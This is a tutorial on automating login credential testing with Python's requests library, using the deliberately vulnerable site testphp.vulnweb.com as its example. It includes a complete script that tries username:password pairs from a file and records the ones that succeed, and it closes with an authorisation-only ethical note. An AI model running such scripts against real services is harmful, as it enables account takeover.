# Credential Testing with Python

## Overview

Testing credentials against login forms is common in penetration testing. Python's `requests` library makes it straightforward to automate this process. However, **detecting successful vs. failed logins is site-specific**. Each login form behaves differently.

## Form Inspection

Before writing code, you must understand the target login form:

1. **Find the form action** – Where does the form submit?
   - View page source, search for `<form`
   - Look for `action` attribute

2. **Identify field names** – What are the input names?
   - Username field (often `username`, `uname`, `user`, `email`)
   - Password field (usually `password`, `pass`, `pwd`)

3. **Note the method** – POST or GET? (usually POST)

### Example: testphp.vulnweb.com
```html
<form name="loginform" method="post" action="userinfo.php">
  <input name="uname" type="text">
  <input name="pass" type="password">
  <input type="submit" value="login">
</form>
```

- **Action:** `userinfo.php`
- **Username field:** `uname`
- **Password field:** `pass`
- **Method:** POST

## Basic Login Submission
```python
import requests

url = "http://testphp.vulnweb.com/userinfo.php"
payload = {
    "uname": "test",
    "pass": "test123"
}

response = requests.post(url, data=payload)
print(response.status_code)
print(response.text[:500])
```

## Detecting Login Success/Failure

**This is the hardest part.** Different sites use different mechanisms:

### Option 1: HTTP Status Code
```python
response = requests.post(url, data=payload, allow_redirects=False)

if response.status_code == 302:  # Redirect = failed login
    status = "FAILED"
elif response.status_code == 200:  # OK = success
    status = "SUCCESS"
```

**Problem:** Some sites redirect on *success*, others on *failure*. You must test both.

### Option 2: Response Content
```python
response = requests.post(url, data=payload, allow_redirects=True)

if "user info" in response.text.lower():
    status = "SUCCESS"
elif "login failed" in response.text.lower():
    status = "FAILED"
else:
    status = "UNKNOWN"
```

**Problem:** Error messages vary by site. You must inspect the HTML.

### Option 3: Redirect Location
```python
response = requests.post(url, data=payload, allow_redirects=False)

if response.status_code == 302:
    location = response.headers.get('Location')
    if 'login.php' in location:
        status = "FAILED"
    else:
        status = "SUCCESS"
```

## Real Example: testphp.vulnweb.com

Testing against this site revealed:
- **Failed login:** Status 302, redirects to `login.php`, content = "you must login"
- **Successful login:** Status 200, content contains "user info"
```python
response = requests.post(url, data=payload, allow_redirects=False)

if response.status_code == 302:
    status = "FAILED"
elif response.status_code == 200 and "user info" in response.text.lower():
    status = "SUCCESS"
else:
    status = "UNKNOWN"
```

## Full Credential Testing Script
```python
#!/usr/bin/python3

import requests
import csv

url = "http://testphp.vulnweb.com/userinfo.php"
headers = {
    "User-Agent": "Mozilla/5.0"
}

valid_creds = []

# Read credentials from file
with open("creds.txt", "r") as file:
    for line in file:
        line = line.strip()  # Remove newline
        if not line:
            continue
        
        uname, passwd = line.split(":")
        payload = {"uname": uname, "pass": passwd}
        
        response = requests.post(url, headers=headers, data=payload, allow_redirects=False)
        
        # Detect success (site-specific logic)
        if response.status_code != 302:  # Not a redirect = success
            print(f"✓ Valid: {uname}:{passwd}")
            valid_creds.append([uname, passwd])
        else:
            print(f"✗ Invalid: {uname}:{passwd}")

# Save valid credentials to CSV
with open("valid_creds.csv", "w", newline="") as file:
    writer = csv.writer(file)
    writer.writerow(["Username", "Password"])
    writer.writerows(valid_creds)

print(f"\nFound {len(valid_creds)} valid credentials")
```

## Important Details

### 1. Strip Newlines
Always strip whitespace from credential files before splitting:
```python
line = line.strip()  # Remove \n
uname, passwd = line.split(":")
```

Without this, the password will include `\n`, causing login to fail.

### 2. Don't Follow Redirects
Use `allow_redirects=False` to see the actual server response:
```python
response = requests.post(url, data=payload, allow_redirects=False)
```

With `allow_redirects=True` (default), you won't see the 302 status.

### 3. Site-Specific Detection
**Every site is different.** What works for `testphp.vulnweb.com` won't work for GitHub, WordPress, etc.

Approach:
1. Test one valid credential manually (curl, browser, Burp)
2. Test one invalid credential manually
3. Compare responses (status code, headers, content)
4. Build detection logic based on differences

### 4. Headers and User-Agent
Some sites check User-Agent. Include realistic headers:
```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0"
}
```

### 5. Error Handling
Add try/except for network errors:
```python
try:
    response = requests.post(url, data=payload, timeout=5)
except requests.exceptions.Timeout:
    print(f"Timeout: {uname}")
except requests.exceptions.ConnectionError:
    print(f"Connection error: {uname}")
```

## Common Pitfalls

❌ **Don't:** Assume all sites behave the same way
❌ **Don't:** Ignore the need to inspect form structure first
❌ **Don't:** Use default timeout (server might be slow)
❌ **Don't:** Assume status codes tell the whole story

✅ **Do:** Test against the actual target first
✅ **Do:** Verify your detection logic with known credentials
✅ **Do:** Add delays between requests (be respectful)
✅ **Do:** Log both successes and failures for analysis

## Ethical Note

Only test credentials against systems you own or have explicit written permission to test. Unauthorized credential testing is illegal.

## See Also

- API_INTERACTION.md (requests library basics)
- EXCEPTION_HANDLING.md (error management)
- CSV_FILE_OPERATIONS.md (saving results)
